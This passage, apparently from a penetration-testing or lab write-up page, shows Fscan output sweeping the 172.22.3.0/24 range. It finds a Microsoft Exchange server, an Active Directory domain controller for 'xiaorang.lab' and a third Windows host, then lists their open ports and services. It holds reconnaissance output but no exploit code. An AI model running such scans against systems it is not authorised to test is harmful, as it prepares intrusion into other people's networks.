</span></span><span class="line"><span class="ln">  5</span><span class="cl">│  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
</span></span><span class="line"><span class="ln">  6</span><span class="cl">│ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     │
</span></span><span class="line"><span class="ln">  7</span><span class="cl">│ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    │
</span></span><span class="line"><span class="ln">  8</span><span class="cl">└──────────────────────────────────────────────┘
</span></span><span class="line"><span class="ln">  9</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">[2025-04-09 00:51:47] [INFO] 暴力破解线程数: 1
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">[2025-04-09 00:51:47] [INFO] 开始信息扫描
</span></span><span class="line"><span class="ln"> 13</span><span class="cl">[2025-04-09 00:51:47] [INFO] CIDR范围: 172.22.3.0-172.22.3.255
</span></span><span class="line"><span class="ln"> 14</span><span class="cl">[2025-04-09 00:51:47] [INFO] 生成IP范围: 172.22.3.0.<span class="nv">%!d(string=172.22.3.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl">[2025-04-09 00:51:47] [INFO] 解析CIDR 172.22.3.0/24 -<span class="p">&gt;</span> IP范围 172.22.3.0-172.22.3.255
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">[2025-04-09 00:51:48] [INFO] 已排除指定主机: 1 个
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">[2025-04-09 00:51:48] [INFO] 最终有效主机数量: 255
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">[2025-04-09 00:51:48] [INFO] 开始主机扫描
</span></span><span class="line"><span class="ln"> 19</span><span class="cl">[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.2      存活 (ICMP<span class="p">)</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.26     存活 (ICMP)
</span></span><span class="line"><span class="ln"> 21</span><span class="cl">[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.9      存活 (ICMP)
</span></span><span class="line"><span class="ln"> 22</span><span class="cl">[2025-04-09 00:51:51] [INFO] 存活主机数量: 3
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">[2025-04-09 00:51:51] [INFO] 有效端口数量: 65535
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:25
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:53
</span></span><span class="line"><span class="ln"> 26</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:80
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:88
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:81
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 服务识别 172.22.3.9:25 =<span class="p">&gt;</span> [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:135
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:135
</span></span><span class="line"><span class="ln"> 32</span><span class="cl">[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:139
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:139
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.2:139
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:135
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:389
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:445
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.26:445
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:444
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:445
</span></span><span class="line"><span class="ln"> 41</span><span class="cl">[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:443
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:465
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:464
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:477
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:476
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:475
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:465 =<span class="p">&gt;</span> [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:88 =&gt; 
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:477 =<span class="p">&gt;</span> [smtp]
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:476 =<span class="p">&gt;</span> [smtp]
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:475 =<span class="p">&gt;</span> [smtp]
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:587
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:593
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:593
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:81 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:636
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:587 =<span class="p">&gt;</span> [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:717
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:593 =<span class="p">&gt;</span> [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:593 =<span class="p">&gt;</span> [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:636 =&gt; 
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:808
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:890
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:717 =<span class="p">&gt;</span> [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.26:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:1801
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:80 =<span class="p">&gt;</span> [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:2103
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2107
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2105
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:389 =<span class="p">&gt;</span> [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:445 =&gt; 
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.9:2525
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.26:445 =&gt; 
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:2525 =<span class="p">&gt;</span> [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:445 =&gt; 
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.2:3268
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3269
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:3269 =&gt; 
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:464 =&gt; 
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3389
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.26:3389
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.9:3389
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:808 =&gt; 
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:890 =&gt; 
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3800
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3801
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3803
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3823
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3828
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3843
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3863
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3867
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">[2025-04-09 00:52:03] [SUCCESS] 端口开放 172.22.3.9:3875
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">[2025-04-09 00:52:05] [SUCCESS] 服务识别 172.22.3.2:3268 =<span class="p">&gt;</span> [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">[2025-04-09 00:52:06] [SUCCESS] 服务识别 172.22.3.26:3389 =&gt; 
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">[2025-04-09 00:52:06] [SUCCESS] 端口开放 172.22.3.9:5060
</span></span><span class="line"><span class="ln">100</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5062
</span></span><span class="line"><span class="ln">101</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5065
</span></span><span class="line"><span class="ln">102</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3801 =&gt; 
</span></span><span class="line"><span class="ln">103</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3803 =&gt; 
</span></span><span class="line"><span class="ln">104</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:1801 =&gt; 
</span></span><span class="line"><span class="ln">105</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3823 =&gt; 
</span></span><span class="line"><span class="ln">106</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3828 =&gt; 
</span></span><span class="line"><span class="ln">107</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3843 =&gt; 
</span></span><span class="line"><span class="ln">108</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3863 =&gt; 
</span></span><span class="line"><span class="ln">109</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3867 =&gt; 
</span></span><span class="line"><span class="ln">110</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6001
</span></span><span class="line"><span class="ln">111</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 服务识别 172.22.3.9:6001 =<span class="p">&gt;</span> [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
</span></span><span class="line"><span class="ln">112</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6027
</span></span><span class="line"><span class="ln">113</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6049
</span></span><span class="line"><span class="ln">114</span><span class="cl">[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6057
</span></span><span class="line"><span class="ln">115</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6081
</span></span><span class="line"><span class="ln">116</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6095
</span></span><span class="line"><span class="ln">117</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6102
</span></span><span class="line"><span class="ln">118</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6119
</span></span><span class="line"><span class="ln">119</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6129
</span></span><span class="line"><span class="ln">120</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6153
</span></span><span class="line"><span class="ln">121</span><span class="cl">[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6193
</span></span><span class="line"><span class="ln">122</span><span class="cl">[2025-04-09 00:52:09] [SUCCESS] 端口开放 172.22.3.9:6228
</span></span><span class="line"><span class="ln">123</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6401
</span></span><span class="line"><span class="ln">124</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6405
</span></span><span class="line"><span class="ln">125</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6400
</span></span><span class="line"><span class="ln">126</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6404
</span></span><span class="line"><span class="ln">127</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6430
</span></span><span class="line"><span class="ln">128</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 服务识别 172.22.3.9:5060 =&gt; 
</span></span><span class="line"><span class="ln">129</span><span class="cl">[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6448
</span></span><span class="line"><span class="ln">130</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6449
</span></span><span class="line"><span class="ln">131</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6454
</span></span><span class="line"><span class="ln">132</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6490
</span></span><span class="line"><span class="ln">133</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6492
</span></span><span class="line"><span class="ln">134</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6497
</span></span><span class="line"><span class="ln">135</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 服务识别 172.22.3.9:3800 =<span class="p">&gt;</span> [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
</span></span><span class="line"><span class="ln">136</span><span class="cl">[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6512
</span></span><span class="line"><span class="ln">137</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6514
</span></span><span class="line"><span class="ln">138</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6548
</span></span><span class="line"><span class="ln">139</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6550
</span></span><span class="line"><span class="ln">140</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6560
</span></span><span class="line"><span class="ln">141</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6571
</span></span><span class="line"><span class="ln">142</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6564
</span></span><span class="line"><span class="ln">143</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6570
</span></span><span class="line"><span class="ln">144</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6572
</span></span><span class="line"><span class="ln">145</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6578
</span></span><span class="line"><span class="ln">146</span><span class="cl">[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6590
</span></span><span class="line"><span class="ln">147</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6594
</span></span><span class="line"><span class="ln">148</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6606
</span></span><span class="line"><span class="ln">149</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6616
</span></span><span class="line"><span class="ln">150</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6621
</span></span><span class="line"><span class="ln">151</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6624
</span></span><span class="line"><span class="ln">152</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6642
</span></span><span class="line"><span class="ln">153</span><span class="cl">[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6664
</span></span><span class="line"><span class="ln">154</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6685
</span></span><span class="line"><span class="ln">155</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6690
</span></span><span class="line"><span class="ln">156</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6719
</span></span><span class="line"><span class="ln">157</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6728
</span></span><span class="line"><span class="ln">158</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6741
</span></span><span class="line"><span class="ln">159</span><span class="cl">[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6770
</span></span><span class="line"><span class="ln">160</span><span class="cl">[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5062 =&gt; 
</span></span><span class="line"><span class="ln">161</span><span class="cl">[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5065 =&gt; 
</span></span><span class="line"><span class="ln">162</span><span class="cl">[2025-04-09 00:52:17] [SUCCESS] 端口开放 172.22.3.9:6772
</span></span><span class="line"><span class="ln">163</span><span class="cl">[2025-04-09 00:52:18] [SUCCESS] 端口开放 172.22.3.9:7673
</span></span><span class="line"><span class="ln">164</span><span class="cl">[2025-04-09 00:52:19] [SUCCESS] 服务识别 172.22.3.9:6664 =&gt; 
</span></span><span class="line"><span class="ln">165</span><span class="cl">[2025-04-09 00:52:20] [SUCCESS] 端口开放 172.22.3.9:8172
</span></span><span class="line"><span class="ln">166</span><span class="cl">[2025-04-09 00:52:51] [SUCCESS] 服务识别 172.22.3.2:53 =&gt; 
</span></span><span class="line"><span class="ln">167</span><span class="cl">[2025-04-09 00:52:52] [SUCCESS] 端口开放 172.22.3.2:9389
</span></span><span class="line"><span class="ln">168</span><span class="cl">[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2103 =&gt; 
</span></span><span class="line"><span class="ln">169</span><span class="cl">[2025-04-09 00:52:53] [SUCCESS] 端口开放 172.22.3.9:9710
</span></span><span class="line"><span class="ln">170</span><span class="cl">[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2107 =&gt; 
</span></span><span class="line"><span class="ln">171</span><span class="cl">[2025-04-09 00:52:55] [SUCCESS] 端口开放 172.22.3.9:12393
</span></span><span class="line"><span class="ln">172</span><span class="cl">[2025-04-09 00:52:55] [SUCCESS] 服务识别 172.22.3.9:444 =&gt; 
</span></span><span class="line"><span class="ln">173</span><span class="cl">[2025-04-09 00:52:56] [SUCCESS] 服务识别 172.22.3.2:135 =&gt; 
</span></span><span class="line"><span class="ln">174</span><span class="cl">[2025-04-09 00:52:57] [SUCCESS] 端口开放 172.22.3.26:15774
</span></span><span class="line"><span class="ln">175</span><span class="cl">[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.2:9389 =&gt; 
</span></span><span class="line"><span class="ln">176</span><span class="cl">[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.9:135 =&gt; 
</span></span><span class="line"><span class="ln">177</span><span class="cl">[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.26:135 =&gt; 
</span></span><span class="line"><span class="ln">178</span><span class="cl">[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:9710 =&gt; 
</span></span><span class="line"><span class="ln">179</span><span class="cl">[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:3875 =&gt; 
</span></span><span class="line"><span class="ln">180</span><span class="cl">[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:2105 =&gt; 
</span></span><span class="line"><span class="ln">181</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6027 =&gt; 
</span></span><span class="line"><span class="ln">182</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6049 =&gt; 
</span></span><span class="line"><span class="ln">183</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6057 =&gt; 
</span></span><span class="line"><span class="ln">184</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6081 =&gt; 
</span></span><span class="line"><span class="ln">185</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6095 =&gt; 
</span></span><span class="line"><span class="ln">186</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6102 =&gt; 
</span></span><span class="line"><span class="ln">187</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6119 =&gt; 
</span></span><span class="line"><span class="ln">188</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6129 =&gt; 
</span></span><span class="line"><span class="ln">189</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6153 =&gt; 
</span></span><span class="line"><span class="ln">190</span><span class="cl">[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6193 =&gt; 
</span></span><span class="line"><span class="ln">191</span><span class="cl">[2025-04-09 00:53:04] [SUCCESS] 服务识别 172.22.3.9:6228 =&gt; 
</span></span><span class="line"><span class="ln">192</span><span class="cl">[2025-04-09 00:53:05] [SUCCESS] 服务识别 172.22.3.9:12393 =&gt; 
</span></span><span class="line"><span class="ln">193</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6401 =&gt; 
</span></span><span class="line"><span class="ln">194</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6405 =&gt; 
</span></span><span class="line"><span class="ln">195</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6400 =&gt; 
</span></span><span class="line"><span class="ln">196</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.2:3389 =&gt; 
</span></span><span class="line"><span class="ln">197</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6404 =&gt; 
</span></span><span class="line"><span class="ln">198</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6430 =&gt; 
</span></span><span class="line"><span class="ln">199</span><span class="cl">[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:3389 =&gt; 
</span></span><span class="line"><span class="ln">200</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6448 =&gt; 
</span></span><span class="line"><span class="ln">201</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.26:15774 =&gt; 
</span></span><span class="line"><span class="ln">202</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6449 =&gt; 
</span></span><span class="line"><span class="ln">203</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6454 =&gt; 
</span></span><span class="line"><span class="ln">204</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6490 =&gt; 
</span></span><span class="line"><span class="ln">205</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6492 =&gt; 
</span></span><span class="line"><span class="ln">206</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6497 =&gt; 
</span></span><span class="line"><span class="ln">207</span><span class="cl">[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6512 =&gt; 
</span></span><span class="line"><span class="ln">208</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6514 =&gt; 
